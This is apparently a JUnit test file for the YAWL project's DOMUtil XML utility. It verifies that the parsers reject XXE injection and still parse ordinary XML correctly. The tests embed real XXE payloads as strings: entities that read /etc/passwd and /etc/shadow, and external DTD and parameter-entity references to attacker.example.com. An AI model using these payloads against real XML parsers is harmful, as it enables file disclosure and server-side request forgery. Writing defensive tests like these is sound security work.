package org.yawlfoundation.yawl.util;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.w3c.dom.Document;

import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.SAXException;
import java.io.IOException;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests verifying that DOMUtil's XXE (XML External Entity) injection protections
 * are correctly applied to all XML parsers (SOC2 CRITICAL finding).
 *
 * Each test attempts an attack vector that must be blocked:
 *   - File disclosure via DOCTYPE + SYSTEM entity
 *   - Server-Side Request Forgery via external DTD loading
 *   - DOCTYPE declaration itself (disallowed)
 *
 * @author YAWL Foundation
 * @since 5.2
 */
public class TestDOMUtilXxeProtection {

    // =========================================================================
    // DOCTYPE / DTD attack - must be rejected
    // =========================================================================

    @Test
    @DisplayName("getDocumentFromString rejects DOCTYPE declarations")
    void getDocumentFromString_rejectsDoctypeDeclaration() {
        // Classic XXE: DOCTYPE with SYSTEM entity pointing to local file
        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                "]>\n" +
                "<root><data>&xxe;</data></root>";

        // Parser must reject the DOCTYPE declaration - either via SAXException (from the
        // disallow-doctype-decl feature) or Exception during parser init (from the
        // ACCESS_EXTERNAL_DTD attribute, which some parsers reject as unrecognized before parse).
        assertThrows(Exception.class,
                () -> DOMUtil.getDocumentFromString(xxePayload),
                "DOMUtil must reject DOCTYPE declarations to prevent XXE injection");
    }

    @Test
    @DisplayName("getDocumentFromString rejects DOCTYPE with external DTD")
    void getDocumentFromString_rejectsExternalDtd() {
        String xxePayload = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo SYSTEM \"http://attacker.example.com/evil.dtd\">\n" +
                "<root/>";

        assertThrows(Exception.class,
                () -> DOMUtil.getDocumentFromString(xxePayload),
                "DOMUtil must reject external DTD references");
    }

    @Test
    @DisplayName("getDocumentFromString rejects DOCTYPE with parameter entity")
    void getDocumentFromString_rejectsParameterEntity() {
        String xxePayload = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ENTITY % xxe SYSTEM \"http://attacker.example.com/evil.dtd\">\n" +
                "  %xxe;\n" +
                "]>\n" +
                "<root/>";

        assertThrows(Exception.class,
                () -> DOMUtil.getDocumentFromString(xxePayload),
                "DOMUtil must reject parameter entities");
    }

    // =========================================================================
    // Normal XML - must parse correctly
    // =========================================================================

    @Test
    @DisplayName("getDocumentFromString parses safe XML without DOCTYPE")
    void getDocumentFromString_parsesSafeXml() throws Exception {
        String safeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<specification id=\"test\" version=\"1.0\">" +
                "<name>Test Spec</name>" +
                "</specification>";

        Document doc = DOMUtil.getDocumentFromString(safeXml);

        assertNotNull(doc, "Safe XML must parse to a non-null Document");
        assertEquals("specification", doc.getDocumentElement().getLocalName(),
                "Root element must be 'specification'");
    }

    @Test
    @DisplayName("getDocumentFromString handles nested elements correctly")
    void getDocumentFromString_handlesNestedElements() throws Exception {
        String xml = "<workflow><task id=\"t1\"><name>Task One</name></task></workflow>";

        Document doc = DOMUtil.getDocumentFromString(xml);

        assertNotNull(doc);
        assertEquals("workflow", doc.getDocumentElement().getLocalName());
        assertNotNull(doc.getElementsByTagName("task").item(0));
    }

    @Test
    @DisplayName("getNamespacelessDocumentFromString parses namespace-free XML")
    void getNamespacelessDocumentFromString_parsesSafeXml() throws Exception {
        String xml = "<root><child attr=\"value\">text</child></root>";

        Document doc = DOMUtil.getNamespacelessDocumentFromString(xml);

        assertNotNull(doc, "Namespace-free XML must parse correctly");
        assertEquals("root", doc.getDocumentElement().getNodeName());
    }

    @Test
    @DisplayName("getNamespacelessDocumentFromString rejects DOCTYPE")
    void getNamespacelessDocumentFromString_rejectsDoctypeDeclaration() {
        String xxePayload = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>\n" +
                "<root>&xxe;</root>";

        assertThrows(Exception.class,
                () -> DOMUtil.getNamespacelessDocumentFromString(xxePayload),
                "Namespaceless parser must also reject DOCTYPE declarations");
    }

    // =========================================================================
    // getNodeText - null safety
    // =========================================================================

    @Test
    @DisplayName("getNodeText returns empty string (not null) for null node")
    void getNodeText_nullNode_returnsEmptyString() throws Exception {
        String result = DOMUtil.getNodeText(null);
        assertNotNull(result, "getNodeText(null) must not return null");
        assertEquals(0, result.length(), "getNodeText(null) must return an empty string");
    }

    @Test
    @DisplayName("getNodeText returns correct text for simple element")
    void getNodeText_simpleElement_returnsText() throws Exception {
        Document doc = DOMUtil.getDocumentFromString("<elem>hello world</elem>");
        String text = DOMUtil.getNodeText(doc.getDocumentElement());
        assertEquals("hello world", text, "getNodeText must return element text content");
    }

    @Test
    @DisplayName("createDocumentInstance returns namespace-aware document")
    void createDocumentInstance_returnsDocument() throws ParserConfigurationException {
        Document doc = DOMUtil.createDocumentInstance();
        assertNotNull(doc, "createDocumentInstance must return a non-null Document");
    }
}
